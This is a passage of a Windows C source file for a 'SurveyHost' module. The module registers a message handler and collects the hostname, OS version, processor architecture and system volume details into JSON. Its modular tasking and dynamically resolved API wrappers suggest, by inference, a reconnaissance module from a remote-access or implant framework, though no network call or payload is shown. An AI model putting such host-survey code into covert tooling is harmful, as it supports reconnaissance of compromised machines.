#include "Internal_Functions.h"
#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "LIB_SurveyHost.h"


#define SZ_SystemRoot "%SystemDrive%"


// Global variables
cJSON* g_lpJsonSurveyHostConfig = NULL;


DWORD _SurveyHostGetHostname(cJSON* lpJsonSurveyHostResponseResult)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	cJSON*	lpJsonComputerName = NULL;

	CHAR*	szComputerName = NULL;
	DWORD	dwComputerNameSize = 0;
	
	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("start"));

			if (NULL == lpJsonSurveyHostResponseResult)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyHostResponseResult is NULL")
				);
				__leave;
			}

			m_SurveyHost_GetComputerNameExA(
				ComputerNamePhysicalDnsFullyQualified, 
				szComputerName,
				&dwComputerNameSize
			);
			dwComputerNameSize = dwComputerNameSize + 1; // null terminator
			dwErrorCode = ALLOC(dwComputerNameSize, (LPVOID*)(&szComputerName));
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("ALLOC( %d, %p ) failed.(%08x)"),
					dwComputerNameSize,
					(LPVOID*)(&szComputerName),
					dwErrorCode
				);
				__leave;
			}
			if (FALSE == m_SurveyHost_GetComputerNameExA(
				ComputerNameDnsFullyQualified,
				szComputerName,
				&dwComputerNameSize
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_SurveyHost_GetComputerNameExA( %08x, %p, %p ) failed.(%08x)"),
					ComputerNamePhysicalDnsFullyQualified,
					szComputerName,
					&dwComputerNameSize,
					dwErrorCode
				);
				__leave;
			}

			lpJsonComputerName = cJSON_CreateString(szComputerName);
			if (NULL == lpJsonComputerName)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonComputerName = cJSON_CreateString failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonSurveyHostResponseResult, SurveyHost_Response_ComputerName, lpJsonComputerName);


		} // end try-finally
		__finally
		{
			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != szComputerName)
				{
					FREE(szComputerName);
					szComputerName = NULL;
				}
			}
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyHostInitialization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	cJSON*	lpJsonSurveyHostInitializeInput = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	cJSON*	lpJsonSurveyHostInitializeOutput = NULL;
	CHAR*	szSurveyHostOutput = NULL;
	DWORD	dwSurveyHostOutputSize = 0;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}

			
			/********************************************************************************
				Convert input string into JSON
			********************************************************************************/
			lpJsonSurveyHostInitializeInput = cJSON_Parse((CHAR*)lpInputBuffer);
			if (NULL == lpJsonSurveyHostInitializeInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					(CHAR*)lpInputBuffer
				);
				__leave;
			}

			// Set the local module's configuration to the input configuration
			g_lpJsonSurveyHostConfig = lpJsonSurveyHostInitializeInput;
			// and then null the input configuration so it isn't free'd in the finally
			lpJsonSurveyHostInitializeInput = NULL;


			/********************************************************************************
				Initialize internal functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Initialize_SurveyHost_Kernel32_Functions()"));
			dwErrorCode = Initialize_SurveyHost_Kernel32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Initialize_SurveyHost_Kernel32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}


			/********************************************************************************
				Perform additional initialization actions
			********************************************************************************/


			/********************************************************************************
				Register callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Register SurveyHost_Request"));
			bRegisterResult = RegisterModuleMessageHandler(
				g_lpJsonSurveyHostConfig,
				SurveyHost_Request,
				SurveyHostCallbackInterface
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("RegisterModuleMessageHandler(%p, %S, %p) failed."),
					g_lpJsonSurveyHostConfig,
					SurveyHost_Request,
					SurveyHostCallbackInterface
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Register SurveyHost_Request was successful."));
			}


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			//szSurveyHostOutput = cJSON_Print(lpJsonSurveyHostInitializeOutput);
			//if (NULL == szSurveyHostOutput)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_Print(%p) failed."),
			//		lpJsonSurveyHostInitializeOutput
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szSurveyHostOutput:     %p"), szSurveyHostOutput);
			////printf("szSurveyHostOutput:\n%s\n", szSurveyHostOutput);
			//dwSurveyHostOutputSize = (DWORD)strlen(szSurveyHostOutput);

			//(*lppOutputBuffer) = (LPBYTE)szSurveyHostOutput;
			//(*lpdwOutputBufferSize) = dwSurveyHostOutputSize;

		} // end try-finally
		__finally
		{
			// Delete input and output JSON objects
			if (NULL != lpJsonSurveyHostInitializeInput)
			{
				cJSON_Delete(lpJsonSurveyHostInitializeInput);
				lpJsonSurveyHostInitializeInput = NULL;
			}
			if (NULL != lpJsonSurveyHostInitializeOutput)
			{
				cJSON_Delete(lpJsonSurveyHostInitializeOutput);
				lpJsonSurveyHostInitializeOutput = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyHostFinalization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szSurveyHostInput = NULL;
	DWORD	dwSurveyHostInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonMessageType = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	CHAR*	szSurveyHostOutput = NULL;
	DWORD	dwSurveyHostOutputSize = 0;
	cJSON*	lpJsonSurveyHostOutput = NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//if (NULL == lpInputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpInputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//szSurveyHostInput = (char*)lpInputBuffer;
			//dwSurveyHostInputSize = dwInputBufferSize;


			/********************************************************************************
				Unregister callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister SurveyHost_Request"));
			bRegisterResult = UnregisterModuleMessageHandler(
				g_lpJsonSurveyHostConfig,
				SurveyHost_Request
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("UnregisterModuleMessageHandler(%p, %S) failed."),
					g_lpJsonSurveyHostConfig,
					SurveyHost_Request
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister SurveyHost_Request was successful."));
			}


			/********************************************************************************
				Perform additional Finalization actions
			********************************************************************************/


			/********************************************************************************
				Finalize internal functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Finalize_SurveyHost_Kernel32_Functions()"));
			dwErrorCode = Finalize_SurveyHost_Kernel32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Finalize_SurveyHost_Kernel32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}


		} // end try-finally
		__finally
		{
			/********************************************************************************
				Delete local JSON config
			********************************************************************************/
			if (NULL != g_lpJsonSurveyHostConfig)
			{
				cJSON_Delete(g_lpJsonSurveyHostConfig);
				g_lpJsonSurveyHostConfig = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyHostCallbackInterface(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szSurveyHostInput = NULL;
	DWORD	dwSurveyHostInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonSurveyHostRequestEntries = NULL;
	cJSON*	lpJsonSurveyHostRequestEntry = NULL;

	CHAR*	szSurveyHostOutput = NULL;
	DWORD	dwSurveyHostOutputSize = 0;
	cJSON*	lpJsonSurveyHostOutput = NULL;
	//cJSON*	lpJsonSurveyHostResponse = NULL;
	cJSON*	lpJsonSurveyHostResponseResults = NULL;
	cJSON*	lpJsonSurveyHostResponseResult = NULL;

	cJSON*	lpJsonVersionInfo = NULL;
	cJSON*	lpJsonVersionInfoMajorVersion = NULL;
	cJSON*	lpJsonVersionInfoMinorVersion = NULL;
	cJSON*	lpJsonVersionInfoServicePackMajor = NULL;
	cJSON*	lpJsonVersionInfoServicePackMinor = NULL;
	cJSON*	lpJsonVersionInfoCSDVersion = NULL;
	cJSON*	lpJsonVersionInfoSuiteMask = NULL;
	cJSON*	lpJsonVersionInfoProductType = NULL;
	cJSON*	lpJsonSystemInfo = NULL;
	cJSON*	lpJsonSystemInfoProcessorArchitecture = NULL;
	cJSON*	lpJsonVolumeInfo = NULL;
	cJSON*	lpJsonVolumeInfoRootPathName = NULL;
	cJSON*	lpJsonVolumeInfoVolumeName = NULL;
	cJSON*	lpJsonVolumeInfoSerialNumber = NULL;
	cJSON*	lpJsonVolumeInfoFileSystemFlags = NULL;
	cJSON*	lpJsonVolumeInfoFileSystemName = NULL;

	OSVERSIONINFOEXA versionInformation;
	SYSTEM_INFO systemInformation;

	CHAR	szRootPathName[MAX_PATH];
	CHAR	szVolumeName[MAX_PATH + 1];
	CHAR	szFileSystemName[MAX_PATH + 1];
	DWORD	dwSerialNumber		= 0;
	DWORD	dwMaxComponentLen	= 0;
	DWORD	dwFileSystemFlags	= 0;

	

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);


			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			//if (NULL == lpInputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpInputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//szSurveyHostInput = (char*)lpInputBuffer;
			//dwSurveyHostInputSize = dwInputBufferSize;


			/********************************************************************************
				Check input for new configuration
			********************************************************************************/
			//lpJsonInput = cJSON_Parse(szSurveyHostInput);
			//if (NULL == lpJsonInput)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_Parse(%p) failed."),
			//		lpInputBuffer
			//	);
			//	__leave;
			//}


			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create the output JSON object
			lpJsonSurveyHostOutput = cJSON_CreateObject();
			if (NULL == lpJsonSurveyHostOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyHostOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}

			//// Create the SurveyHost_Response JSON object
			//lpJsonSurveyHostResponse = cJSON_AddObjectToObject(lpJsonSurveyHostOutput, SurveyHost_Response);
			//if (NULL == lpJsonSurveyHostResponse)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpJsonSurveyHostResponse = cJSON_AddObjectToObject(%p, %S) failed.\n"),
			//		lpJsonSurveyHostOutput, SurveyHost_Response
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSurveyHostResponse:    %p"), lpJsonSurveyHostResponse);

			//// Create an array of SurveyHost_Registry_Results JSON objects
			//lpJsonSurveyHostResponseResults = cJSON_AddArrayToObject(lpJsonSurveyHostOutput, SurveyHost_Response_Results);
			//if (NULL == lpJsonSurveyHostResponseResults)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpJsonSurveyHostResponseResults = cJSON_AddArrayToObject(%p,%S) failed."),
			//		lpJsonSurveyHostOutput,
			//		SurveyHost_Response_Results
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSurveyHostResponseResults:    %p"), lpJsonSurveyHostResponseResults);

			//// Create a JSON result entry
			//lpJsonSurveyHostResponseResult = cJSON_CreateObject();
			//if (NULL == lpJsonSurveyHostResponseResult)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpJsonSurveyHostResponseResult = cJSON_CreateObject() failed.\n")
			//	);
			//	__leave;
			//}


			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			// Get the hostname
			dwErrorCode = _SurveyHostGetHostname(lpJsonSurveyHostOutput);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("_SurveyHostGetHostname( %p ) failed.(%08x)"),
					lpJsonSurveyHostOutput,
					dwErrorCode
				);
				__leave;
			}

			// Get the version info
			ZeroMemory(&versionInformation, sizeof(versionInformation));
			versionInformation.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
			if (FALSE == m_SurveyHost_GetVersionExA((LPOSVERSIONINFOA)&versionInformation))
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_SurveyHost_GetVersionExA( %p ) failed.(%08x)"),
					&versionInformation,
					dwErrorCode
				);
				__leave;
			}
			
			// Create the version info JSON object
			lpJsonVersionInfo = cJSON_CreateObject();
			if (NULL == lpJsonVersionInfo)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVersionInfo = cJSON_CreateObject() failed.\n")
				);
				__leave;
			}

			//DBGPRINT(DEBUG_VERBOSE, TEXT("versionInformation OS: %ld.%ld"), versionInformation.dwMajorVersion, versionInformation.dwMinorVersion);
			lpJsonVersionInfoMajorVersion = cJSON_CreateNumber(versionInformation.dwMajorVersion);
			if (NULL == lpJsonVersionInfoMajorVersion)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVersionInfoMajorVersion = cJSON_CreateNumber failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVersionInfo, SurveyHost_Response_VersionInfoMajorVersion, lpJsonVersionInfoMajorVersion);
			lpJsonVersionInfoMinorVersion = cJSON_CreateNumber(versionInformation.dwMinorVersion);
			if (NULL == lpJsonVersionInfoMinorVersion)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVersionInfoMinorVersion = cJSON_CreateNumber failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVersionInfo, SurveyHost_Response_VersionInfoMinorVersion, lpJsonVersionInfoMinorVersion);

			//DBGPRINT(DEBUG_VERBOSE, TEXT("versionInformation SP: %hd.%hd"), versionInformation.wServicePackMajor, versionInformation.wServicePackMinor);
			lpJsonVersionInfoServicePackMajor = cJSON_CreateNumber(versionInformation.wServicePackMajor);
			if (NULL == lpJsonVersionInfoServicePackMajor)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVersionInfoServicePackMajor = cJSON_CreateNumber failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVersionInfo, SurveyHost_Response_VersionInfoServicePackMajor, lpJsonVersionInfoServicePackMajor);
			lpJsonVersionInfoServicePackMinor = cJSON_CreateNumber(versionInformation.wServicePackMinor);
			if (NULL == lpJsonVersionInfoServicePackMinor)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVersionInfoServicePackMinor = cJSON_CreateNumber failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVersionInfo, SurveyHost_Response_VersionInfoServicePackMinor, lpJsonVersionInfoServicePackMinor);

			//DBGPRINT(DEBUG_VERBOSE, TEXT("versionInformation CSD: %S"), versionInformation.szCSDVersion);
			lpJsonVersionInfoCSDVersion = cJSON_CreateString(versionInformation.szCSDVersion);
			if (NULL == lpJsonVersionInfoCSDVersion)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVersionInfoCSDVersion = cJSON_CreateString failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVersionInfo, SurveyHost_Response_VersionInfoCSDVersion, lpJsonVersionInfoCSDVersion);

			//DBGPRINT(DEBUG_VERBOSE, TEXT("versionInformation Suite: %hd"), versionInformation.wSuiteMask);
			lpJsonVersionInfoSuiteMask = cJSON_CreateNumber(versionInformation.wSuiteMask);
			if (NULL == lpJsonVersionInfoSuiteMask)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVersionInfoSuiteMask = cJSON_CreateNumber failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVersionInfo, SurveyHost_Response_VersionInfoSuiteMask, lpJsonVersionInfoSuiteMask);

			//DBGPRINT(DEBUG_VERBOSE, TEXT("versionInformation Prod:  %hhd"), versionInformation.wProductType);
			lpJsonVersionInfoProductType = cJSON_CreateNumber(versionInformation.wProductType);
			if (NULL == lpJsonVersionInfoProductType)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVersionInfoProductType = cJSON_CreateNumber failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVersionInfo, SurveyHost_Response_VersionInfoProductType, lpJsonVersionInfoProductType);

			// Add the version info object to the overall entry
			cJSON_AddItemToObject(lpJsonSurveyHostOutput, SurveyHost_Response_VersionInfo, lpJsonVersionInfo);


			ZeroMemory(&systemInformation, sizeof(systemInformation));
			m_SurveyHost_GetNativeSystemInfo(&systemInformation);
			
			// Create the system info JSON object
			lpJsonSystemInfo = cJSON_CreateObject();
			if (NULL == lpJsonSystemInfo)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSystemInfo = cJSON_CreateObject() failed.\n")
				);
				__leave;
			}

			//DBGPRINT(DEBUG_VERBOSE, TEXT("systemInformation arch: %hd "), systemInformation.wProcessorArchitecture);
			lpJsonSystemInfoProcessorArchitecture = cJSON_CreateNumber(systemInformation.wProcessorArchitecture);
			if (NULL == lpJsonSystemInfoProcessorArchitecture)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSystemInfoProcessorArchitecture = cJSON_CreateNumber failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonSystemInfo, SurveyHost_Response_SystemInfoProcessorArchitecture, lpJsonSystemInfoProcessorArchitecture);

			// Add the version info object to the overall entry
			cJSON_AddItemToObject(lpJsonSurveyHostOutput, SurveyHost_Response_SystemInfo, lpJsonSystemInfo);


			ZeroMemory(szRootPathName, sizeof(szRootPathName));
			if (0 == m_SurveyHost_ExpandEnvironmentStringsA(
				SZ_SystemRoot, 
				szRootPathName, 
				sizeof(szRootPathName)
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_SurveyHost_ExpandEnvironmentStringsA( %p, %p, %d ) failed.(%08x)"),
					SZ_SystemRoot,
					szRootPathName,
					sizeof(szRootPathName),
					dwErrorCode
				);
				__leave;
			}
			strcat(szRootPathName, "\\");
			ZeroMemory(szVolumeName, sizeof(szVolumeName));
			ZeroMemory(szFileSystemName, sizeof(szFileSystemName));
			if (FALSE == m_SurveyHost_GetVolumeInformationA(
				szRootPathName,
				szVolumeName,
				sizeof(szVolumeName),
				&dwSerialNumber,
				&dwMaxComponentLen,
				&dwFileSystemFlags,
				szFileSystemName,
				sizeof(szFileSystemName)
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_SurveyHost_GetVolumeInformationA( %p, %p, %d, %p, %p, %p, %p, %d ) failed.(%08x:%d)"),
					szRootPathName,
					szVolumeName,
					sizeof(szVolumeName),
					&dwSerialNumber,
					&dwMaxComponentLen,
					&dwFileSystemFlags,
					szFileSystemName,
					sizeof(szFileSystemName),
					dwErrorCode,
					dwErrorCode
				);
				__leave;
			}

			// Create the volume info JSON object
			lpJsonVolumeInfo = cJSON_CreateObject();
			if (NULL == lpJsonVolumeInfo)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVolumeInfo = cJSON_CreateObject() failed.\n")
				);
				__leave;
			}

			//DBGPRINT(DEBUG_VERBOSE, TEXT("szRootPathName:    %S"), szRootPathName);
			lpJsonVolumeInfoRootPathName = cJSON_CreateString(szRootPathName);
			if (NULL == lpJsonVolumeInfoRootPathName)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVolumeInfoRootPathName = cJSON_CreateString failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVolumeInfo, SurveyHost_Response_VolumeInfoRootPathName, lpJsonVolumeInfoRootPathName);

			//DBGPRINT(DEBUG_VERBOSE, TEXT("szVolumeName:      %S"), szVolumeName);
			lpJsonVolumeInfoVolumeName = cJSON_CreateString(szVolumeName);
			if (NULL == lpJsonVolumeInfoVolumeName)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVolumeInfoVolumeName = cJSON_CreateString failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVolumeInfo, SurveyHost_Response_VolumeInfoVolumeName, lpJsonVolumeInfoVolumeName);

			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwSerialNumber:    %08x"), dwSerialNumber);
			lpJsonVolumeInfoSerialNumber = cJSON_CreateNumber(dwSerialNumber);
			if (NULL == lpJsonVolumeInfoSerialNumber)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVolumeInfoSerialNumber = cJSON_CreateNumber failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVolumeInfo, SurveyHost_Response_VolumeInfoSerialNumber, lpJsonVolumeInfoSerialNumber);

			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwFileSystemFlags: %08x"), dwFileSystemFlags);
			lpJsonVolumeInfoFileSystemFlags = cJSON_CreateNumber(dwFileSystemFlags);
			if (NULL == lpJsonVolumeInfoFileSystemFlags)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVolumeInfoFileSystemFlags = cJSON_CreateNumber failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVolumeInfo, SurveyHost_Response_VolumeInfoFileSystemFlags, lpJsonVolumeInfoFileSystemFlags);

			//DBGPRINT(DEBUG_VERBOSE, TEXT("szFileSystemName:  %S"), szFileSystemName);
			lpJsonVolumeInfoFileSystemName = cJSON_CreateString(szFileSystemName);
			if (NULL == lpJsonVolumeInfoFileSystemName)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonVolumeInfoFileSystemName = cJSON_CreateString failed.\n")
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonVolumeInfo, SurveyHost_Response_VolumeInfoFileSystemName, lpJsonVolumeInfoFileSystemName);

			// Add the version info object to the overall entry
			cJSON_AddItemToObject(lpJsonSurveyHostOutput, SurveyHost_Response_VolumeInfo, lpJsonVolumeInfo);


			// Add current entry to overall results list
			//cJSON_AddItemToObject(lpJsonSurveyHostOutput, lpJsonSurveyHostResponseResult);


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szSurveyHostOutput = cJSON_Print(lpJsonSurveyHostOutput);
			if (NULL == szSurveyHostOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonSurveyHostOutput
				);
				__leave;
			}
			dwSurveyHostOutputSize = (DWORD)strlen(szSurveyHostOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwSurveyHostOutputSize: %d"), dwSurveyHostOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szSurveyHostOutput:     %p"), szSurveyHostOutput);
			//printf("szSurveyHostOutput:\n%s\n", szSurveyHostOutput);

